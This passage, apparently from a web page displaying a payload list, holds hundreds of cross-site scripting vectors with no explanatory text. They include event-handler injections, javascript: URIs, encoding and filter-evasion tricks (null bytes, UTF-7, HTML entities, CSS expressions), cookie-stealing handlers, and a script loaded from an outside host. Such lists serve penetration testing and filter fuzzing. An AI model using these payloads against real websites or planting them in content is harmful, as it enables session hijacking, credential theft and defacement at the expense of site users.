onscroll=javascript:alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</span><br><span class="line">&lt;form id=test onforminput=javascript:alert(1)&gt;&lt;input&gt;&lt;/form&gt;&lt;button form=test onformchange=javascript:alert(1)&gt;X</span><br><span class="line">&lt;video&gt;&lt;source onerror=&quot;javascript:javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;video onerror=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;source&gt;</span><br><span class="line">&lt;form&gt;&lt;button formaction=&quot;javascript:javascript:alert(1)&quot;&gt;X</span><br><span class="line">&lt;body oninput=javascript:alert(1)&gt;&lt;input autofocus&gt;</span><br><span class="line">&lt;math href=&quot;javascript:javascript:alert(1)&quot;&gt;CLICKME&lt;/math&gt;  &lt;math&gt; &lt;maction actiontype=&quot;statusline#http://google.com&quot; xlink:href=&quot;javascript:javascript:alert(1)&quot;&gt;CLICKME&lt;/maction&gt; &lt;/math&gt;</span><br><span class="line">&lt;frameset onload=javascript:alert(1)&gt;</span><br><span class="line">&lt;table background=&quot;javascript:javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=javascript:alert(1)//&quot;&gt;</span><br><span class="line">&lt;comment&gt;&lt;img src=&quot;&lt;/comment&gt;&lt;img src=x onerror=javascript:alert(1))//&quot;&gt;</span><br><span class="line">&lt;![&gt;&lt;img src=&quot;]&gt;&lt;img src=x onerror=javascript:alert(1)//&quot;&gt;</span><br><span class="line">&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=javascript:alert(1)//&quot;&gt;</span><br><span class="line">&lt;li style=list-style:url() onerror=javascript:alert(1)&gt; &lt;div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)&gt;&lt;/div&gt;</span><br><span class="line">&lt;head&gt;&lt;base href=&quot;javascript://&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=&quot;/. /,javascript:alert(1)//#&quot;&gt;XXX&lt;/a&gt;&lt;/body&gt;</span><br><span class="line">&lt;SCRIPT FOR=document EVENT=onreadystatechange&gt;javascript:alert(1)&lt;/SCRIPT&gt;</span><br><span class="line">&lt;OBJECT CLASSID=&quot;clsid:333C7BC4-460F-11D0-BC04-0080C7055A83&quot;&gt;&lt;PARAM NAME=&quot;DataURL&quot; VALUE=&quot;javascript:alert(1)&quot;&gt;&lt;/OBJECT&gt;</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,%(base64)s&quot;&gt;</span><br><span class="line">&lt;embed src=&quot;data:text/html;base64,%(base64)s&quot;&gt;</span><br><span class="line">&lt;b &lt;script&gt;alert(1)&lt;/script&gt;0</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;input value=&quot;``onmouseover=javascript:alert(1)&quot;&gt;&lt;/div&gt; &lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;&lt;script&gt;document.getElementById(&quot;div2&quot;).innerHTML = document.getElementById(&quot;div1&quot;).innerHTML;&lt;/script&gt;</span><br><span class="line">&lt;x &apos;=&quot;foo&quot;&gt;&lt;x foo=&apos;&gt;&lt;img src=x onerror=javascript:alert(1)//&apos;&gt;</span><br><span class="line">&lt;embed src=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;image src=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;script src=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;div style=width:1px;filter:glow onfilterchange=javascript:alert(1)&gt;x</span><br><span class="line">&lt;? foo=&quot;&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;! foo=&quot;&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;/ foo=&quot;&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;? foo=&quot;&gt;&lt;x foo=&apos;?&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&apos;&gt;&quot;&gt;</span><br><span class="line">&lt;! foo=&quot;[[[Inception]]&quot;&gt;&lt;x foo=&quot;]foo&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;% foo&gt;&lt;x foo=&quot;%&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;div id=d&gt;&lt;x xmlns=&quot;&gt;&lt;iframe onload=javascript:alert(1)&quot;&gt;&lt;/div&gt; &lt;script&gt;d.innerHTML=d.innerHTML&lt;/script&gt;</span><br><span class="line">&lt;img \x00src=x onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;img \x47src=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img \x11src=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img \x12src=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img\x47src=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img\x10src=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img\x13src=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img\x32src=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img\x47src=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img\x11src=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img \x47src=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img \x34src=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img \x39src=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img \x00src=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src\x09=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src\x10=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src\x13=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src\x32=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src\x12=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src\x11=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src\x00=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src\x47=x onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x\x09onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x\x10onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x\x11onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x\x12onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x\x13onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img[a][b][c]src[d]=x[e]onerror=[f]&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=\x09&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=\x10&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=\x11&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=\x12&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=\x32&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=\x00&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;a href=java&amp;#1&amp;#2&amp;#3&amp;#4&amp;#5&amp;#6&amp;#7&amp;#8&amp;#11&amp;#12script:javascript:alert(1)&gt;XXX&lt;/a&gt;</span><br><span class="line">&lt;img src=&quot;x` `&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;` `&gt;</span><br><span class="line">&lt;img src onerror /&quot; &apos;&quot;= alt=javascript:alert(1)//&quot;&gt;</span><br><span class="line">&lt;title onpropertychange=javascript:alert(1)&gt;&lt;/title&gt;&lt;title title=&gt;</span><br><span class="line">&lt;a href=http://foo.bar/#x=`y&gt;&lt;/a&gt;&lt;img alt=&quot;`&gt;&lt;img src=x:x onerror=javascript:alert(1)&gt;&lt;/a&gt;&quot;&gt;</span><br><span class="line">&lt;!--[if]&gt;&lt;script&gt;javascript:alert(1)&lt;/script --&gt;</span><br><span class="line">&lt;!--[if&lt;img src=x onerror=javascript:alert(1)//]&gt; --&gt;</span><br><span class="line">&lt;script src=&quot;/\%(jscript)s&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;\\%(jscript)s&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;object id=&quot;x&quot; classid=&quot;clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598&quot;&gt;&lt;/object&gt; &lt;object classid=&quot;clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B&quot; onqt_error=&quot;javascript:alert(1)&quot; style=&quot;behavior:url(#x);&quot;&gt;&lt;param name=postdomevents /&gt;&lt;/object&gt;</span><br><span class="line">&lt;a style=&quot;-o-link:&apos;javascript:javascript:alert(1)&apos;;-o-link-source:current&quot;&gt;X</span><br><span class="line">&lt;style&gt;p[foo=bar&#123;&#125;*&#123;-o-link:&apos;javascript:javascript:alert(1)&apos;&#125;&#123;&#125;*&#123;-o-link-source:current&#125;]&#123;color:red&#125;;&lt;/style&gt;</span><br><span class="line">&lt;link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d</span><br><span class="line">&lt;style&gt;@import &quot;data:,*%7bx:expression(javascript:alert(1))%7D&quot;;&lt;/style&gt;</span><br><span class="line">&lt;a style=&quot;pointer-events:none;position:absolute;&quot;&gt;&lt;a style=&quot;position:absolute;&quot; onclick=&quot;javascript:alert(1);&quot;&gt;XXX&lt;/a&gt;&lt;/a&gt;&lt;a href=&quot;javascript:javascript:alert(1)&quot;&gt;XXX&lt;/a&gt;</span><br><span class="line">&lt;style&gt;*[&#123;&#125;@import&apos;%(css)s?]&lt;/style&gt;X</span><br><span class="line">&lt;div style=&quot;font-family:&apos;foo&amp;#10;;color:red;&apos;;&quot;&gt;XXX</span><br><span class="line">&lt;div style=&quot;font-family:foo&#125;color=red;&quot;&gt;XXX</span><br><span class="line">&lt;// style=x:expression\28javascript:alert(1)\29&gt;</span><br><span class="line">&lt;style&gt;*&#123;x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))&#125;&lt;/style&gt;</span><br><span class="line">&lt;div style=content:url(%(svg)s)&gt;&lt;/div&gt;</span><br><span class="line">&lt;div style=&quot;list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));&quot;&gt;X</span><br><span class="line">&lt;div id=d&gt;&lt;div style=&quot;font-family:&apos;sans\27\3B color\3Ared\3B&apos;&quot;&gt;X&lt;/div&gt;&lt;/div&gt; &lt;script&gt;with(document.getElementById(&quot;d&quot;))innerHTML=innerHTML&lt;/script&gt;</span><br><span class="line">&lt;div style=&quot;background:url(/f#&amp;#127;oo/;color:red/*/foo.jpg);&quot;&gt;X</span><br><span class="line">&lt;div style=&quot;font-family:foo&#123;bar;background:url(http://foo.f/oo&#125;;color:red/*/foo.jpg);&quot;&gt;X</span><br><span class="line">&lt;div id=&quot;x&quot;&gt;XXX&lt;/div&gt; &lt;style&gt;  #x&#123;font-family:foo[bar;color:green;&#125;  #y];color:red;&#123;&#125;  &lt;/style&gt;</span><br><span class="line">&lt;x style=&quot;background:url(&apos;x&amp;#1;;color:red;/*&apos;)&quot;&gt;XXX&lt;/x&gt;</span><br><span class="line">&lt;script&gt;(&#123;set/**/$($)&#123;_/**/setter=$,_=javascript:alert(1)&#125;&#125;).$=eval&lt;/script&gt;</span><br><span class="line">&lt;script&gt;(&#123;0:#0=eval/#0#/#0#(javascript:alert(1))&#125;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;ReferenceError.prototype.__defineGetter__(&apos;name&apos;, function()&#123;javascript:alert(1)&#125;),x&lt;/script&gt;</span><br><span class="line">&lt;script&gt;Object.__noSuchMethod__ = Function,[&#123;&#125;][0].constructor._(&apos;javascript:alert(1)&apos;)()&lt;/script&gt;</span><br><span class="line">&lt;meta charset=&quot;x-imap4-modified-utf7&quot;&gt;&amp;ADz&amp;AGn&amp;AG0&amp;AEf&amp;ACA&amp;AHM&amp;AHI&amp;AGO&amp;AD0&amp;AGn&amp;ACA&amp;AG8Abg&amp;AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&amp;ACAAPABi</span><br><span class="line">&lt;meta charset=&quot;x-imap4-modified-utf7&quot;&gt;&amp;&lt;script&amp;S1&amp;TS&amp;1&gt;alert&amp;A7&amp;(1)&amp;R&amp;UA;&amp;&amp;&lt;&amp;A9&amp;11/script&amp;X&amp;&gt;</span><br><span class="line">&lt;meta charset=&quot;mac-farsi&quot;&gt;¼script¾javascript:alert(1)¼/script¾</span><br><span class="line">X&lt;x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` &gt;</span><br><span class="line">1&lt;set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&amp;#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&amp;lt;img/src=&amp;quot;x&amp;quot;onerror=javascript:alert(1)&amp;gt;`&gt;</span><br><span class="line">1&lt;animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&amp;lt;img/src=&amp;quot;.&amp;quot;onerror=javascript:alert(1)&amp;gt;&gt;</span><br><span class="line">&lt;vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss&gt;&lt;/vmlframe&gt;</span><br><span class="line">1&lt;a href=#&gt;&lt;line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /&gt;&lt;/a&gt;</span><br><span class="line">&lt;a style=&quot;behavior:url(#default#AnchorClick);&quot; folder=&quot;javascript:javascript:alert(1)&quot;&gt;XXX&lt;/a&gt;</span><br><span class="line">&lt;x style=&quot;behavior:url(%(sct)s)&quot;&gt;</span><br><span class="line">&lt;xml id=&quot;xss&quot; src=&quot;%(htc)s&quot;&gt;&lt;/xml&gt; &lt;label dataformatas=&quot;html&quot; datasrc=&quot;#xss&quot; datafld=&quot;payload&quot;&gt;&lt;/label&gt;</span><br><span class="line">&lt;event-source src=&quot;%(event)s&quot; onload=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;a href=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;event-source src=&quot;data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A&quot;&gt;</span><br><span class="line">&lt;div id=&quot;x&quot;&gt;x&lt;/div&gt; &lt;xml:namespace prefix=&quot;t&quot;&gt; &lt;import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt; &lt;t:set attributeName=&quot;innerHTML&quot; targetElement=&quot;x&quot; to=&quot;&amp;lt;img&amp;#11;src=x:x&amp;#11;onerror&amp;#11;=javascript:alert(1)&amp;gt;&quot;&gt;</span><br><span class="line">&lt;script&gt;%(payload)s&lt;/script&gt;</span><br><span class="line">&lt;script src=%(jscript)s&gt;&lt;/script&gt;</span><br><span class="line">&lt;script language=&apos;javascript&apos; src=&apos;%(jscript)s&apos;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&lt;IMG SRC=&quot;javascript:javascript:alert(1);&quot;&gt;</span><br><span class="line">&lt;IMG SRC=javascript:javascript:alert(1)&gt;</span><br><span class="line">&lt;IMG SRC=`javascript:javascript:alert(1)`&gt;</span><br><span class="line">&lt;SCRIPT SRC=%(jscript)s?&lt;B&gt;</span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:javascript:alert(1);&quot;&gt;&lt;/FRAMESET&gt;</span><br><span class="line">&lt;BODY ONLOAD=javascript:alert(1)&gt;</span><br><span class="line">&lt;BODY ONLOAD=javascript:javascript:alert(1)&gt;</span><br><span class="line">&lt;IMG SRC=&quot;jav    ascript:javascript:alert(1);&quot;&gt;</span><br><span class="line">&lt;BODY onload!#$%%&amp;()*~+-_.,:;?@[/|\]^`=javascript:alert(1)&gt;</span><br><span class="line">&lt;SCRIPT/SRC=&quot;%(jscript)s&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;&lt;SCRIPT&gt;%(payload)s//&lt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;IMG SRC=&quot;javascript:javascript:alert(1)&quot;</span><br><span class="line">&lt;iframe src=%(scriptlet)s &lt;</span><br><span class="line">&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:javascript:alert(1);&quot;&gt;</span><br><span class="line">&lt;IMG DYNSRC=&quot;javascript:javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;IMG LOWSRC=&quot;javascript:javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;BGSOUND SRC=&quot;javascript:javascript:alert(1);&quot;&gt;</span><br><span class="line">&lt;BR SIZE=&quot;&amp;&#123;javascript:alert(1)&#125;&quot;&gt;</span><br><span class="line">&lt;LAYER SRC=&quot;%(scriptlet)s&quot;&gt;&lt;/LAYER&gt;</span><br><span class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:javascript:alert(1);&quot;&gt;</span><br><span class="line">&lt;STYLE&gt;@import&apos;%(css)s&apos;;&lt;/STYLE&gt;</span><br><span class="line">&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;%(css)s&gt;; REL=stylesheet&quot;&gt;</span><br><span class="line">&lt;XSS STYLE=&quot;behavior: url(%(htc)s);&quot;&gt;</span><br><span class="line">&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:javascript:alert(1)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span><br><span class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:javascript:alert(1);&quot;&gt;</span><br><span class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:javascript:alert(1);&quot;&gt;</span><br><span class="line">&lt;IFRAME SRC=&quot;javascript:javascript:alert(1);&quot;&gt;&lt;/IFRAME&gt;</span><br><span class="line">&lt;TABLE BACKGROUND=&quot;javascript:javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;background-image: url(javascript:javascript:alert(1))&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;width:expression(javascript:alert(1));&quot;&gt;</span><br><span class="line">&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(javascript:alert(1))&quot;&gt;</span><br><span class="line">&lt;XSS STYLE=&quot;xss:expression(javascript:alert(1))&quot;&gt;</span><br><span class="line">&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/STYLE&gt;</span><br><span class="line">&lt;STYLE&gt;.XSS&#123;background-image:url(&quot;javascript:javascript:alert(1)&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</span><br><span class="line">&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:javascript:alert(1)&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="line">&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;javascript:alert(1);&lt;/SCRIPT&gt;&lt;![endif]--&gt;</span><br><span class="line">&lt;BASE HREF=&quot;javascript:javascript:alert(1);//&quot;&gt;</span><br><span class="line">&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;%(scriptlet)s&quot;&gt;&lt;/OBJECT&gt;</span><br><span class="line">&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:javascript:alert(1)&gt;&lt;/OBJECT&gt;</span><br><span class="line">&lt;HTML xmlns:xss&gt;&lt;?import namespace=&quot;xss&quot; implementation=&quot;%(htc)s&quot;&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt;&quot;&quot;&quot;,&quot;XML namespace.&quot;),(&quot;&quot;&quot;&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&amp;lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:javascript:alert(1)&quot;&amp;gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;</span><br><span class="line">&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&amp;lt;SCRIPT DEFER&amp;gt;javascript:alert(1)&amp;lt;/SCRIPT&amp;gt;&quot;&gt;&lt;/BODY&gt;&lt;/HTML&gt;</span><br><span class="line">&lt;SCRIPT SRC=&quot;%(jpg)s&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-</span><br><span class="line">&lt;form id=&quot;test&quot; /&gt;&lt;button form=&quot;test&quot; formaction=&quot;javascript:javascript:alert(1)&quot;&gt;X</span><br><span class="line">&lt;body onscroll=javascript:alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</span><br><span class="line">&lt;P STYLE=&quot;behavior:url(&apos;#default#time2&apos;)&quot; end=&quot;0&quot; onEnd=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;STYLE&gt;@import&apos;%(css)s&apos;;&lt;/STYLE&gt;</span><br><span class="line">&lt;STYLE&gt;a&#123;background:url(&apos;s1&apos; &apos;s2)&#125;@import javascript:javascript:alert(1);&apos;);&#125;&lt;/STYLE&gt;</span><br><span class="line">&lt;meta charset= &quot;x-imap4-modified-utf7&quot;&amp;&amp;&gt;&amp;&amp;&lt;script&amp;&amp;&gt;javascript:alert(1)&amp;&amp;;&amp;&amp;&lt;&amp;&amp;/script&amp;&amp;&gt;</span><br><span class="line">&lt;SCRIPT onreadystatechange=javascript:javascript:alert(1);&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;style onreadystatechange=javascript:javascript:alert(1);&gt;&lt;/style&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;html:html xmlns:html=&apos;http://www.w3.org/1999/xhtml&apos;&gt;&lt;html:script&gt;javascript:alert(1);&lt;/html:script&gt;&lt;/html:html&gt;</span><br><span class="line">&lt;embed code=%(scriptlet)s&gt;&lt;/embed&gt;</span><br><span class="line">&lt;embed code=javascript:javascript:alert(1);&gt;&lt;/embed&gt;</span><br><span class="line">&lt;embed src=%(jscript)s&gt;&lt;/embed&gt;</span><br><span class="line">&lt;frameset onload=javascript:javascript:alert(1)&gt;&lt;/frameset&gt;</span><br><span class="line">&lt;object onerror=javascript:javascript:alert(1)&gt;</span><br><span class="line">&lt;embed type=&quot;image&quot; src=%(scriptlet)s&gt;&lt;/embed&gt;</span><br><span class="line">&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&lt;![CDATA[cript:javascript:alert(1);&quot;&gt;]]&lt;/C&gt;&lt;X&gt;&lt;/xml&gt;</span><br><span class="line">&lt;IMG SRC=&amp;&#123;javascript:alert(1);&#125;;&gt;</span><br><span class="line">&lt;a href=&quot;jav&amp;#65ascript:javascript:alert(1)&quot;&gt;test1&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;jav&amp;#97ascript:javascript:alert(1)&quot;&gt;test1&lt;/a&gt;</span><br><span class="line">&lt;embed width=500 height=500 code=&quot;data:text/html,&lt;script&gt;%(payload)s&lt;/script&gt;&quot;&gt;&lt;/embed&gt;</span><br><span class="line">&lt;iframe srcdoc=&quot;&amp;LT;iframe&amp;sol;srcdoc=&amp;amp;lt;img&amp;sol;src=&amp;amp;apos;&amp;amp;apos;onerror=javascript:alert(1)&amp;amp;gt;&gt;&quot;&gt;</span><br><span class="line">&apos;;alert(String.fromCharCode(88,83,83))//&apos;;alert(String.fromCharCode(88,83,83))//&quot;;</span><br><span class="line">alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--</span><br><span class="line">&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</span><br><span class="line">&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;</span><br><span class="line">&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;</span><br><span class="line">&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;</span><br><span class="line">&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;</span><br><span class="line">&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;</span><br><span class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</span><br><span class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line">&lt;IMG SRC=# onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;</span><br><span class="line">&lt;IMG SRC= onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;</span><br><span class="line">&lt;IMG onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;</span><br><span class="line">&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</span><br><span class="line">&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</span><br><span class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line">&lt;IMG SRC=&quot;jav 